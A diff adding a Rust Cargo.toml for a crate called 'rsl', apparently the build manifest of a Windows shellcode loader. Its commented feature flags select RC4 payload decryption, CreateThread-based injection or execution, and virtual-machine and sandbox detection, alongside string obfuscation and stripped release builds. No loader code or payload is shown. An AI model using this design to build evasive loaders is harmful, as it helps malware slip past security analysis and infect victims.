@@ -1,0 +1,54 @@
+[package]
+name = "rsl"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+tempfile = "3.10.1"
+rand= "0.8.5"
+base64 = "0.21.5"
+winapi = { version = "0.3.9", features = ["winhttp", "winuser", "memoryapi", "synchapi", "handleapi", "errhandlingapi", "processthreadsapi", "debugapi", "sysinfoapi", "fileapi", "winbase", "iphlpapi", "ntdef", "ifdef", "winsock2", "iptypes", "ws2def", "processenv","debugapi"] }
+windows-sys = { version = "0.42.0", features = ["Win32_System_Memory", "Win32_Foundation", "Win32_System_Threading", "Win32_System_LibraryLoader"] }
+time = "0.3.30"
+winreg = "0.52.0"
+libloading ="0.8.3"
+uuid = { version = "1.0", features = ["v4"] }
+libc = "0.2"
+memmap2 = "0.6.1"
+dirs = "4.0"
+sha2 = "0.10"
+obfstr = "0.3"
+rustcrypt-ct-macros = "0.1"
+serde = { version = "1.0", features = ["derive"] }
+rc4 = "0.1"
+generic-array = "0.14"
+typenum = "1.16"
+
+[build-dependencies]
+embed-resource = "1.8.0"
+base64 = "0.21.5"
+rand = "0.8.5"
+
+
+
+[features]
+# 解密算法特性开关
+decrypt_rc4 = []
+
+# 注入/执行方式
+run_create_thread = []
+
+# 虚拟机/沙箱检测特性
+vm_check_tick = []
+vm_check_mouse = []
+vm_check_desktop_files = []
+no_sandbox = []
+
+
+[profile.release]
+opt-level = 3
+lto = true
+codegen-units = 1
+strip = true
+debug = false
+split-debuginfo = "off"
